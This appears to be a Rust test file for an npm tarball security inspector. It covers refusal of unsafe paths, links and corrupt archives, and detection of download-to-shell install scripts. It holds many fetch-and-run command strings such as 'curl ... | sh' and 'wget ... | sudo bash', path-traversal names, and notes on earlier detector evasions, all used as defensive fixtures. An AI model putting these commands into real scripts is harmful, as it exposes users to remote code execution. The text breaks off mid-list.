use super::*;
use flate2::{write::GzEncoder, Compression};
use sha2::{Digest, Sha256};
use std::io::Write;

const METADATA: &[u8] = br#"{"name":"fixture-package","version":"1.0.0"}"#;

fn header(name: &str, body: &[u8], kind: u8) -> [u8; 512] {
    assert!(name.len() <= 100);
    let mut header = [0u8; 512];
    header[..name.len()].copy_from_slice(name.as_bytes());
    header[100..108].copy_from_slice(b"0000644\0");
    header[108..116].copy_from_slice(b"0000000\0");
    header[116..124].copy_from_slice(b"0000000\0");
    header[124..136].copy_from_slice(format!("{:011o}\0", body.len()).as_bytes());
    header[136..148].copy_from_slice(b"00000000000\0");
    header[156] = kind;
    header[257..263].copy_from_slice(b"ustar\0");
    header[263..265].copy_from_slice(b"00");
    checksum(&mut header);
    header
}

fn checksum(header: &mut [u8; 512]) {
    header[148..156].fill(b' ');
    let sum: usize = header.iter().map(|b| usize::from(*b)).sum();
    header[148..156].copy_from_slice(format!("{sum:06o}\0 ").as_bytes());
}

fn append(tar: &mut Vec<u8>, name: &str, body: &[u8], kind: u8) {
    tar.extend_from_slice(&header(name, body, kind));
    tar.extend_from_slice(body);
    let padding = (512 - body.len() % 512) % 512;
    tar.resize(tar.len() + padding, 0);
}

fn finish(mut tar: Vec<u8>) -> Vec<u8> {
    tar.resize(tar.len() + 1024, 0);
    tar
}

fn gzip(bytes: &[u8]) -> Vec<u8> {
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(bytes).unwrap();
    encoder.finish().unwrap()
}

fn package(metadata: &[u8], files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut tar = Vec::new();
    append(&mut tar, "package/package.json", metadata, b'0');
    for (name, bytes) in files {
        append(&mut tar, name, bytes, b'0');
    }
    gzip(&finish(tar))
}

fn inspect(bytes: &[u8]) -> NpmInspection {
    read_npm_tarball(bytes, "fixture-package-1.0.0.tgz", &NpmLimits::default())
}

fn assert_refused(bytes: &[u8], kind: NpmIssueKind) {
    let result = inspect(bytes);
    assert_eq!(result.archive_state, NpmArchiveState::Refused, "{result:?}");
    assert!(!result.coverage.archive_complete);
    assert!(!result.coverage.static_analysis_complete);
    assert!(
        result.files.is_empty(),
        "No content analyzer or partial inventory on structural refusal"
    );
    assert!(result.signals.is_empty());
    assert!(
        result
            .coverage
            .issues
            .iter()
            .any(|issue| issue.kind == kind),
        "{result:?}"
    );
}

fn pax_record(key: &str, value: &str) -> Vec<u8> {
    let body = format!(" {key}={value}\n");
    let mut len = body.len() + 1;
    loop {
        let next = body.len() + len.to_string().len();
        if next == len {
            return format!("{len}{body}").into_bytes();
        }
        len = next;
    }
}

#[test]
fn valid_package_retains_exact_transport_and_member_identities() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let js = b"module.exports=(a,b)=>a+b;";
    let bytes = package(METADATA, &[("package/index.js", js)]);
    let result = inspect(&bytes);
    assert_eq!(result.archive_state, NpmArchiveState::Accepted);
    assert!(result.coverage.archive_complete);
    assert!(result.coverage.metadata_complete);
    assert!(result.coverage.static_analysis_complete);
    assert!(result
        .coverage
        .analysis_scope
        .contains("behavior_not_proven"));
    assert_eq!(
        result.artifact.sha256,
        Some(hex::encode(Sha256::digest(&bytes)))
    );
    assert_eq!(result.artifact.compressed_bytes, Some(bytes.len() as u64));
    assert_eq!(result.artifact.name.as_deref(), Some("fixture-package"));
    assert_eq!(result.files[1].sha256, hex::encode(Sha256::digest(js)));
    assert!(result.signals.is_empty());
    assert_eq!(result.provenance_verification, "not_performed_offline");
    let json = serde_json::to_string(&result).unwrap();
    let restored: NpmInspection = serde_json::from_str(&json).unwrap();
    assert_eq!(result, restored);
    assert!(restored.check_schema());
}

#[test]
fn real_npm_pack_fixture_is_accepted_without_extracting_or_running_scripts() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let bytes = include_bytes!("../../tests/fixtures/npm/npm-11.19.0-portable-pax.tgz");
    let result = inspect(bytes);
    assert_eq!(
        result.artifact.sha256.as_deref(),
        Some("769755af559bda513cfe86d6c433bf8e6c0b2431dbb24955393e0dc69eeb2c0f")
    );
    assert_eq!(
        result.archive_state,
        NpmArchiveState::Accepted,
        "{result:?}"
    );
    assert!(result.coverage.archive_complete);
    assert!(result.coverage.metadata_complete);
    assert!(result.coverage.static_analysis_complete, "{result:?}");
    assert_eq!(result.files.len(), 4);
    assert!(result
        .files
        .iter()
        .any(|file| file.path.ends_with("résumé.js")));
    assert!(result
        .signals
        .iter()
        .all(|signal| signal.level == NpmSignalLevel::Observation));
}

#[test]
fn node_tar_pax_long_paths_unicode_sizes_and_metadata_are_supported() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let mut tar = Vec::new();
    append(
        &mut tar,
        "GlobalHead",
        &pax_record("comment", "node-tar compatible"),
        b'g',
    );
    append(&mut tar, "package/package.json", METADATA, b'0');
    let path = format!("package/{}résumé.js", "long-directory/".repeat(10));
    let mut pax = pax_record("path", &path);
    pax.extend(pax_record("size", "19"));
    pax.extend(pax_record("mtime", "1710000000.125"));
    pax.extend(pax_record("SCHILY.dev", "16777232"));
    pax.extend(pax_record("SCHILY.ino", "42"));
    pax.extend(pax_record("SCHILY.nlink", "1"));
    append(&mut tar, "PaxHeader/resume.js", &pax, b'x');
    let body = b"module.exports = 1;";
    assert_eq!(body.len(), 19);
    let mut entry = header("package/placeholder", b"", b'0');
    checksum(&mut entry);
    tar.extend(entry);
    tar.extend(body);
    tar.resize(tar.len() + 512 - body.len(), 0);
    let result = inspect(&gzip(&finish(tar)));
    assert_eq!(
        result.archive_state,
        NpmArchiveState::Accepted,
        "{result:?}"
    );
    assert_eq!(result.files[1].path, path);
    assert_eq!(result.files[1].size, 19);
}

#[test]
fn unsafe_portable_paths_are_refused_on_every_platform() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    for path in [
        "../escape",
        "/absolute",
        "package/../escape",
        "package//x",
        "package/./x",
        "other/x",
        "package/a\\b",
        "package/C:evil",
        "package/NUL.txt",
        "package/COM¹.js",
        "package/file.",
        "package/file ",
        "package/SOURCE~1.JS",
        "package/x\u{7f}",
    ] {
        let mut tar = Vec::new();
        append(&mut tar, path, b"x", b'0');
        assert_refused(&gzip(&finish(tar)), NpmIssueKind::UnsafePath);
    }
}

#[test]
fn links_special_files_and_gnu_sparse_extensions_refuse_before_analysis() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    for (kind, expected) in [
        (b'1', NpmIssueKind::LinkMember),
        (b'2', NpmIssueKind::LinkMember),
        (b'3', NpmIssueKind::SpecialMember),
        (b'4', NpmIssueKind::SpecialMember),
        (b'6', NpmIssueKind::SpecialMember),
        (b'S', NpmIssueKind::UnsupportedExtension),
        (b'L', NpmIssueKind::UnsupportedExtension),
        (b'K', NpmIssueKind::UnsupportedExtension),
    ] {
        let mut tar = Vec::new();
        append(&mut tar, "package/member", b"", kind);
        assert_refused(&gzip(&finish(tar)), expected);
    }
    let mut tar = header("package/setuid", b"", b'0');
    tar[100..108].copy_from_slice(b"0004755\0");
    checksum(&mut tar);
    assert_refused(&gzip(&finish(tar.to_vec())), NpmIssueKind::SpecialMember);
}

#[test]
fn duplicate_case_unicode_and_parent_collisions_are_refused() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    for (first, second) in [
        ("package/a", "package/a"),
        ("package/A", "package/a"),
        ("package/café", "package/cafe\u{301}"),
        ("package/straße", "package/STRASSE"),
        ("package/σ", "package/ς"),
        ("package/a", "package/a/b"),
        ("package/a/b", "package/a"),
    ] {
        let mut tar = Vec::new();
        append(&mut tar, first, b"x", b'0');
        append(&mut tar, second, b"x", b'0');
        assert_refused(&gzip(&finish(tar)), NpmIssueKind::PathCollision);
    }
    let mut tar = Vec::new();
    append(&mut tar, "./package/dir/", b"", b'5');
    append(&mut tar, "package/dir/a.js", b"", b'0');
    append(&mut tar, "package/package.json", METADATA, b'0');
    assert_eq!(
        inspect(&gzip(&finish(tar))).archive_state,
        NpmArchiveState::Accepted
    );
}

#[test]
fn corrupt_headers_padding_and_terminators_do_not_claim_complete() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let mut tar = Vec::new();
    append(&mut tar, "package/package.json", METADATA, b'0');
    let good = finish(tar);
    let mut damaged = good.clone();
    damaged[0] ^= 1;
    assert_refused(&gzip(&damaged), NpmIssueKind::TarCorrupt);
    let mut damaged = good.clone();
    damaged[512 + METADATA.len()] = 1;
    assert_refused(&gzip(&damaged), NpmIssueKind::TarCorrupt);
    assert_refused(&gzip(&good[..good.len() - 512]), NpmIssueKind::TarCorrupt);
    let mut damaged = good.clone();
    *damaged.last_mut().unwrap() = 1;
    assert_refused(&gzip(&damaged), NpmIssueKind::TarCorrupt);
    let mut damaged = good.clone();
    damaged[257] = b'G';
    let mut head: [u8; 512] = damaged[..512].try_into().unwrap();
    checksum(&mut head);
    damaged[..512].copy_from_slice(&head);
    assert_refused(&gzip(&damaged), NpmIssueKind::UnsupportedTarFormat);
    let mut damaged = good;
    damaged[124] = 0x80;
    let mut head: [u8; 512] = damaged[..512].try_into().unwrap();
    checksum(&mut head);
    damaged[..512].copy_from_slice(&head);
    assert_refused(&gzip(&damaged), NpmIssueKind::TarCorrupt);
}

#[test]
fn gzip_crc_truncation_concatenation_and_trailing_bytes_are_refused() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let bytes = package(METADATA, &[]);
    let mut bad_crc = bytes.clone();
    let last = bad_crc.len() - 8;
    bad_crc[last] ^= 1;
    assert_refused(&bad_crc, NpmIssueKind::GzipCorrupt);
    assert_refused(&bytes[..bytes.len() - 1], NpmIssueKind::GzipCorrupt);
    let mut trailing = bytes.clone();
    trailing.push(0);
    assert_refused(&trailing, NpmIssueKind::GzipTrailingData);
    let mut concatenated = bytes.clone();
    concatenated.extend(&bytes);
    assert_refused(&concatenated, NpmIssueKind::GzipTrailingData);
}

#[test]
fn malformed_duplicate_global_and_unknown_pax_semantics_are_refused() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    for (pax, kind, expected) in [
        (
            b"999 path=package/a\n".to_vec(),
            b'x',
            NpmIssueKind::InvalidPax,
        ),
        (
            [
                pax_record("path", "package/a"),
                pax_record("path", "package/b"),
            ]
            .concat(),
            b'x',
            NpmIssueKind::InvalidPax,
        ),
        (
            pax_record("GNU.sparse.size", "1024"),
            b'x',
            NpmIssueKind::UnsupportedExtension,
        ),
        (
            pax_record("path", "package/a"),
            b'g',
            NpmIssueKind::UnsupportedExtension,
        ),
        (pax_record("size", "-1"), b'x', NpmIssueKind::InvalidPax),
        (pax_record("size", "1.5"), b'x', NpmIssueKind::InvalidPax),
        (
            pax_record("size", "184467440737095516160"),
            b'x',
            NpmIssueKind::InvalidPax,
        ),
        (
            pax_record("hdrcharset", "BINARY"),
            b'x',
            NpmIssueKind::UnsupportedExtension,
        ),
        (
            pax_record("linkpath", "../../outside"),
            b'x',
            NpmIssueKind::UnsupportedExtension,
        ),
        (
            pax_record("path", "package/../outside"),
            b'x',
            NpmIssueKind::UnsafePath,
        ),
    ] {
        let mut tar = Vec::new();
        append(&mut tar, "PaxHeader/member", &pax, kind);
        append(&mut tar, "package/member", b"", b'0');
        assert_refused(&gzip(&finish(tar)), expected);
    }
    let mut tar = Vec::new();
    append(
        &mut tar,
        "PaxHeader/member",
        &pax_record("path", "package/a"),
        b'x',
    );
    assert_refused(&gzip(&finish(tar)), NpmIssueKind::TarCorrupt);
}

#[test]
fn input_caps_preserve_no_prefix_hash_and_read_at_most_cap_plus_one() {
    struct Counting {
        count: usize,
    }
    impl Read for Counting {
        fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
            out.fill(b'x');
            self.count += out.len();
            Ok(out.len())
        }
    }
    let mut input = Counting { count: 0 };
    let limits = NpmLimits {
        compressed_bytes: 7,
        ..NpmLimits::default()
    };
    let result = read_npm_tarball(&mut input, "x.tgz", &limits);
    assert_eq!(input.count, 8);
    assert_eq!(result.artifact.sha256, None);
    assert_eq!(result.artifact.compressed_bytes, None);
    assert_eq!(
        result.coverage.issues[0].kind,
        NpmIssueKind::CompressedLimit
    );
    let bytes = package(METADATA, &[]);
    let limits = NpmLimits {
        compressed_bytes: bytes.len(),
        ..NpmLimits::default()
    };
    assert_eq!(
        read_npm_tarball(bytes.as_slice(), "x.tgz", &limits).archive_state,
        NpmArchiveState::Accepted
    );
}

#[test]
fn decompression_ratio_header_member_and_path_limits_are_typed() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let bytes = package(METADATA, &[("package/a.js", b"hello")]);
    for (limits, expected) in [
        (
            NpmLimits {
                decompressed_bytes: 1000,
                ..NpmLimits::default()
            },
            NpmIssueKind::DecompressedLimit,
        ),
        (
            NpmLimits {
                compression_ratio: 1,
                ..NpmLimits::default()
            },
            NpmIssueKind::CompressionRatioLimit,
        ),
        (
            NpmLimits {
                headers: 1,
                ..NpmLimits::default()
            },
            NpmIssueKind::HeaderLimit,
        ),
        (
            NpmLimits {
                member_bytes: 4,
                ..NpmLimits::default()
            },
            NpmIssueKind::MemberLimit,
        ),
        (
            NpmLimits {
                path_bytes: 4,
                ..NpmLimits::default()
            },
            NpmIssueKind::PathLimit,
        ),
        (
            NpmLimits {
                path_depth: 1,
                ..NpmLimits::default()
            },
            NpmIssueKind::PathLimit,
        ),
        (
            NpmLimits {
                total_path_bytes: 25,
                ..NpmLimits::default()
            },
            NpmIssueKind::PathLimit,
        ),
    ] {
        let result = read_npm_tarball(bytes.as_slice(), "fixture.tgz", &limits);
        assert_eq!(result.archive_state, NpmArchiveState::Refused);
        assert_eq!(result.coverage.issues[0].kind, expected);
        assert_eq!(
            result.artifact.sha256,
            Some(hex::encode(Sha256::digest(&bytes)))
        );
    }
    let mut tar = Vec::new();
    append(
        &mut tar,
        "PaxHeader/member",
        &pax_record("path", "package/a"),
        b'x',
    );
    append(&mut tar, "package/a", b"", b'0');
    let limits = NpmLimits {
        headers: 1,
        ..NpmLimits::default()
    };
    let bytes = gzip(&finish(tar));
    assert_eq!(
        read_npm_tarball(bytes.as_slice(), "x.tgz", &limits)
            .coverage
            .issues[0]
            .kind,
        NpmIssueKind::HeaderLimit
    );
}

#[test]
fn duplicate_json_and_contradictory_identity_are_explicit() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    for metadata in [
        br#"{"name":"fixture","name":"changed","version":"1"}"#.as_slice(),
        br#"{"name":"fixture","version":"1","scripts":{"install":"true","install":"curl x | sh"}}"#
            .as_slice(),
        br#"{"name":"fixture","version":"1","scripts":{"install":false}}"#.as_slice(),
    ] {
        let result = inspect(&package(metadata, &[]));
        assert_eq!(result.archive_state, NpmArchiveState::Accepted);
        assert!(result.coverage.archive_complete);
        assert!(!result.coverage.metadata_complete);
        assert!(!result.coverage.static_analysis_complete);
        assert_eq!(
            result.coverage.issues[0].kind,
            NpmIssueKind::InvalidMetadata
        );
    }
    let result = inspect(&package(
        br#"{"name":"fixture","version":"1","_id":"other@2"}"#,
        &[],
    ));
    assert_eq!(result.artifact.name.as_deref(), Some("fixture"));
    assert!(!result.coverage.metadata_complete);
    assert!(result
        .coverage
        .issues
        .iter()
        .any(|issue| issue.kind == NpmIssueKind::ContradictoryIdentity));
}

#[test]
fn ordinary_minified_code_and_lifecycle_scripts_are_not_malicious_signals() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let metadata =
        br#"{"name":"fixture","version":"1","scripts":{"postinstall":"node install.js"}}"#;
    let code = b"(()=>{const a=[1,2,3];console.log(a.map(b=>b+1).join(','))})();";
    let result = inspect(&package(metadata, &[("package/install.js", code)]));
    assert_eq!(result.signals.len(), 1, "{result:?}");
    assert_eq!(result.signals[0].kind, NpmSignalKind::LifecycleScript);
    assert_eq!(result.signals[0].level, NpmSignalLevel::Observation);
    assert!(result.coverage.static_analysis_complete);
    assert_eq!(result.provenance_verification, "not_performed_offline");
}

#[test]
fn literal_download_pipeline_is_distinguished_from_a_quoted_example() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let risky = inspect(&package(br#"{"name":"fixture","version":"1","scripts":{"install":"curl -fsSL https://example.invalid/setup | sh"}}"#, &[]));
    assert!(risky
        .signals
        .iter()
        .any(|signal| signal.kind == NpmSignalKind::DownloadToShell
            && signal.level == NpmSignalLevel::Review));
    let ordinary = inspect(&package(br#"{"name":"fixture","version":"1","scripts":{"install":"echo 'curl https://example.invalid/setup | sh'"}}"#, &[]));
    assert!(ordinary
        .signals
        .iter()
        .all(|signal| signal.level == NpmSignalLevel::Observation));
    assert!(!ordinary.coverage.static_analysis_complete); // External shell effects unresolved.
    let quoted_operator = inspect(&package(br#"{"name":"fixture","version":"1","scripts":{"install":"curl https://example.invalid '|' sh"}}"#, &[]));
    assert!(quoted_operator
        .signals
        .iter()
        .all(|signal| signal.level == NpmSignalLevel::Observation));
}

/// npm_signals used its own word splitter, which gave up on `$`, `>`, `\\`,
/// `(` and backticks, so ordinary download-to-shell scripts produced no signal.
/// The core tokenizer and interpreter resolution handle them.
#[test]
fn download_pipeline_with_variables_wrappers_or_redirections_is_a_review_signal() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let signals_for = |script: &str| {
        let metadata = serde_json::json!({
            "name": "fixture",
            "version": "1",
            "scripts": { "install": script },
        })
        .to_string();
        inspect(&package(metadata.as_bytes(), &[])).signals
    };
    for script in [
        "curl $U | bash",
        "curl -fsSL \"$URL\" | sh",
        "curl -fsSL x | sh >/dev/null",
        "curl -fsSL https://example.invalid/setup | sh 2>&1",
        "wget -qO- https://example.invalid/setup | sudo bash",
        "cd build && curl -fsSL https://example.invalid/s | bash -s -- --yes",
        "curl -fsSL \"https://example.invalid/$(uname)\" | sh",
    ] {
        assert!(
            signals_for(script)
                .iter()
                .any(|signal| signal.kind == NpmSignalKind::DownloadToShell
                    && signal.level == NpmSignalLevel::Review),
            "{script}"
        );
    }
    for script in [
        "echo curl $U | sh",
        "curl $U > setup.sh",
        "curl $U | tee setup.sh",
        "echo 'curl $U | sh'",
    ] {
        assert!(
            signals_for(script)
                .iter()
                .all(|signal| signal.kind != NpmSignalKind::DownloadToShell),
            "{script}"
        );
    }
}

/// The core tokenizer does not split on `|` or newlines inside `{ ... }`, so a
/// fetch-to-shell pipeline inside a brace group or function body produced no
/// signal after npm_signals moved to it (the old scanner reset at every line).
#[test]
fn download_pipeline_inside_brace_group_or_function_body_is_a_review_signal() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let has_signal = |signals: &[NpmSignal]| {
        signals.iter().any(|signal| {
            signal.kind == NpmSignalKind::DownloadToShell && signal.level == NpmSignalLevel::Review
        })
    };
    let bodies = [
        "{\n  curl -fsSL https://example.invalid/setup | sh\n}\n",
        "function install {\n  curl -fsSL https://example.invalid/setup | bash\n}\ninstall\n",
        "install() {\n  curl -fsSL https://example.invalid/setup | bash\n}\ninstall\n",
        "command -v tool || {\n  wget -qO- https://example.invalid/setup | sh\n}\n",
        "{ curl -fsSL https://example.invalid/setup | sh; }",
        "true && { { curl -fsSL https://example.invalid/setup | sh; }; }",
        "(\n  curl -fsSL https://example.invalid/setup | sh\n)\n",
    ];
    for body in bodies {
        let metadata = serde_json::json!({
            "name": "fixture",
            "version": "1",
            "scripts": { "install": body },
        })
        .to_string();
        let from_script = inspect(&package(metadata.as_bytes(), &[])).signals;
        assert!(has_signal(&from_script), "lifecycle script: {body:?}");
        let from_file = inspect(&package(
            br#"{"name":"fixture","version":"1"}"#,
            &[("package/install.sh", body.as_bytes())],
        ))
        .signals;
        assert!(has_signal(&from_file), "shell file: {body:?}");
    }
    for body in [
        "{\n  echo curl https://example.invalid/setup | sh\n}\n",
        "{\n  echo 'curl https://example.invalid/setup | sh'\n}\n",
        "f() {\n  curl https://example.invalid/setup > setup.sh\n}\n",
    ] {
        let metadata = serde_json::json!({
            "name": "fixture",
            "version": "1",
            "scripts": { "install": body },
        })
        .to_string();
        assert!(
            !has_signal(&inspect(&package(metadata.as_bytes(), &[])).signals),
            "{body:?}"
        );
    }
}

/// The brace/function/subshell descent is bounded (depth and body count).
/// Hitting either bound used to return "no pipeline", so 256 trivial groups
/// in front of a pipeline, or nesting it 9 groups deep, hid it. Hitting a
/// bound now records incomplete coverage and falls back to a line pass.
/// Directly adjacent or unindented multi-line braces ("{\n{", "{\ncurl")
/// were also not descended into.
#[test]
fn download_pipeline_past_the_shell_descent_bounds_is_still_a_review_signal() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let has_signal = |signals: &[NpmSignal]| {
        signals.iter().any(|signal| {
            signal.kind == NpmSignalKind::DownloadToShell && signal.level == NpmSignalLevel::Review
        })
    };
    let pipeline = "curl -fsSL https://example.invalid/setup | sh\n";
    let many_groups = |count: usize, tail: &str| format!("{}{tail}", "{ :; }\n".repeat(count));
    let nested = |depth: usize| {
        format!(
            "{}{pipeline}{}",
            "{\n  echo a\n".repeat(depth),
            "}\n".repeat(depth)
        )
    };
    let bounded = [
        many_groups(256, &format!("{{\n  {pipeline}}}\n")),
        many_groups(300, &format!("{{\n  {pipeline}}}\n")),
        nested(9),
        nested(20),
        format!(
            "f() {{\n{}  {pipeline}{}}}\n",
            "(\n".repeat(12),
            ")\n".repeat(12)
        ),
    ];
    // Not past a bound, but the tokenizer keeps a newline inside the command
    // word, so these were not recognised as brace groups.
    let unbounded = [
        format!("{{\n{{\n  {pipeline}}}\n}}\n"),
        format!("{{\n{{\n{pipeline}}}\n}}\n"),
        format!("{{\n{pipeline}}}\n"),
        format!("f() {{\n{{\n{pipeline}}}\n}}\n"),
    ];
    for (body, bound) in bounded
        .iter()
        .map(|body| (body.as_str(), true))
        .chain(unbounded.iter().map(|body| (body.as_str(), false)))
    {
        let metadata = serde_json::json!({
            "name": "fixture",
            "version": "1",
            "scripts": { "install": body },
        })
        .to_string();
        let from_script = inspect(&package(metadata.as_bytes(), &[]));
        assert!(
            has_signal(&from_script.signals),
            "lifecycle script: {body:?}"
        );
        if bound {
            assert!(
                from_script.coverage.issues.iter().any(|issue| {
                    issue.kind == NpmIssueKind::CodeLimit
                        && issue.member.as_deref() == Some("package/package.json")
                }),
                "lifecycle script bound not recorded: {body:?}"
            );
        }
        let from_file = inspect(&package(
            br#"{"name":"fixture","version":"1"}"#,
            &[("package/install.sh", body.as_bytes())],
        ));
        assert!(has_signal(&from_file.signals), "shell file: {body:?}");
        if bound {
            assert!(
                from_file.coverage.issues.iter().any(|issue| {
                    issue.kind == NpmIssueKind::CodeLimit
                        && issue.member.as_deref() == Some("package/install.sh")
                }),
                "shell file bound not recorded: {body:?}"
            );
        }
    }
    // Hitting a bound is incomplete coverage, not a download claim.
    for body in [
        many_groups(300, "echo done\n"),
        format!(
            "{}echo curl https://example.invalid | sh\n{}",
            "{\n".repeat(12),
            "}\n".repeat(12)
        ),
    ] {
        let metadata = serde_json::json!({
            "name": "fixture",
            "version": "1",
            "scripts": { "install": body },
        })
        .to_string();
        let result = inspect(&package(metadata.as_bytes(), &[]));
        assert!(!has_signal(&result.signals), "{body:?}");
        assert!(
            result
                .coverage
                .issues
                .iter()
                .any(|issue| issue.kind == NpmIssueKind::CodeLimit),
            "{body:?}"
        );
    }
}

fn shell_file_has_download_signal(body: &str) -> bool {
    let from_file = inspect(&package(
        br#"{"name":"fixture","version":"1"}"#,
        &[("package/install.sh", body.as_bytes())],
    ));
    from_file.signals.iter().any(|signal| {
        signal.kind == NpmSignalKind::DownloadToShell && signal.level == NpmSignalLevel::Review
    })
}

/// Heredoc text that only SHOWS a download-to-shell command (a `usage()`
/// message, a `: <<'COMMENT'` block, a heredoc read into a variable that is
/// only printed) is data. The core tokenizer read each heredoc line as a
/// command, so it gave a download_to_shell signal. It is ignored only when
/// this file provably never executes it; every way the text can reach a
/// shell keeps the signal.
#[test]
fn heredoc_text_that_is_only_shown_is_not_a_download_signal() {
    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
    let pipeline = "  curl -fsSL https://example.invalid/setup | sh\n";
    let inert = [
        format!(
            "#!/bin/sh\nset -eu\nusage() {{\n  cat <<EOF\nInstall with:\n{pipeline}EOF\n}}\n\
             case \"${{1:-}}\" in\n  -h|--help) usage; exit 0 ;;\n  *) ;;\nesac\n\
             DIR=$(cd \"$(dirname \"$0\")\" && pwd)\necho \"running in $DIR\"\n"
        ),
        format!("cat >&2 <<'EOF'\n{pipeline}EOF\nexit 1\n"),
        format!(
            "usage() {{\n\tcat <<-'EOF' 1>&2\n\t{pipeline}\tEOF\n}}\nusage 2>&1 | head -n 20\n"
        ),
        format!(": <<'COMMENT'\n{pipeline}COMMENT\necho ok\n"),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\necho \"$USAGE\" >&2\n"),
        format!(
            "IFS= read -r -d '' USAGE <<'EOF' || true\n{pipeline}EOF\nprintf '%s\\n' \"$USAGE\"\n"
        ),
        format!("cat <<EOF\nVersion $VERSION, run:\n{pipeline}EOF\n"),
        format!(
            "#!/usr/bin/env bash\n# never pipe curl | sh blindly\nusage() {{\n  cat <<'EOF'\n{pipeline}EOF\n}}\n\
             case \"$1\" in -h|--help) usage >&2; exit 0;; -v|--version) echo 1;; esac\n"
        ),
        // An escaped backslash ends the line, so the next `#` line is a comment.
        format!("cat <<'EOF'\n{pipeline}EOF\necho done \\\\\n# | sh is never run\n"),
        // `>&2` and `&&` are not background separators.
        format!("read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\ntrue && echo \"$USAGE\" >&2\n"),
        // A balanced multi-line quote before the use, a quoted `&` and
        // `set` with options (no variable listing) keep it shown-only.
        format!(
            "set -eu\nread -r -d '' USAGE <<'EOF' || true\n{pipeline}EOF\necho 'two\nlines'\necho \"Tom & Jerry: $USAGE\"\n"
        ),
        // Reading `$PATH` does not change it.
        format!("echo \"using $PATH\"\ncat <<'EOF'\n{pipeline}EOF\n"),
    ];
    // Every shape is checked before failing, so a regression names them all.
    let wrong: Vec<&String> = inert
        .iter()
        .filter(|body| shell_file_has_download_signal(body))
        .collect();
    assert!(wrong.is_empty(), "inert heredoc shapes flagged: {wrong:#?}");
    // Quoted strings were never split at `|`; pin that for multi-line text.
    for body in [
        format!("echo \"Install:\n{pipeline}\"\n"),
        format!("printf '%s\\n' 'Install:\n{pipeline}'\n"),
        format!(
            "IFS= read -r -d '' USAGE <<'EOF' || true\n{pipeline}EOF\nprintf 'Usage {{a,b}} [x] (*?~):\\n%s\\n' \"$USAGE\"\n"
        ),
    ] {
        assert!(
            !shell_file_has_download_signal(&body),
            "quoted text: {body:?}"
        );
    }

    let flagged = [
        // Fed to a shell, eval, source or a file that is run later.
        format!("sh <<'EOF'\n{pipeline}EOF\n"),
        format!("bash -s -- --yes <<'EOF'\n{pipeline}EOF\n"),
        format!("cat <<'EOF' | sh\n{pipeline}EOF\n"),
        format!("cat <<'EOF' | sudo bash\n{pipeline}EOF\n"),
        format!("source /dev/stdin <<'EOF'\n{pipeline}EOF\n"),
        format!(". /dev/stdin <<'EOF'\n{pipeline}EOF\n"),
        format!("eval \"$(cat <<'EOF'\n{pipeline}EOF\n)\"\n"),
        format!("sh <(cat <<'EOF'\n{pipeline}EOF\n)\n"),
        format!("cat <<'EOF' > setup.sh\n{pipeline}EOF\nsh setup.sh\n"),
        format!("cat <<'EOF' >> \"$HOME/.profile\"\n{pipeline}EOF\n"),
        format!("exec >setup.sh\ncat <<'EOF'\n{pipeline}EOF\n"),
        format!("{{\ncat <<'EOF'\n{pipeline}EOF\n}} | sh\n"),
        format!("x=$(\ncat <<'EOF'\n{pipeline}EOF\n)\neval \"$x\"\n"),
        // The printing function's output is executed.
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage | sh\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage | awk '{{ system($0) }}'\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nsh -c \"$(usage)\"\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\ncoproc usage\n"),
        // A variable holding the text is executed.
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\neval \"$USAGE\"\n"),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\nsh -c \"$USAGE\"\n"),
        format!("read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nbash -c \"$USAGE\"\n"),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\necho \"$USAGE\" | sh\n"),
        format!("set -a\nUSAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\nbash ./other.sh\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage > /tmp/setup.sh\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage | tee setup.sh\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage | sort -o setup.sh\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\npython3 -c \"`usage`\"\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nperl -e \"$(usage)\"\n"),
        // Not a case pattern: a subshell closing on a pattern-shaped line.
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\n(echo in\nusage|tac|sh)\n"),
        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\n(\nusage|sh)\n"),
        format!("cat <<'EOF' >&3\n{pipeline}EOF\n"),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\n$USAGE\n"),
        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\nexport USAGE\n"),
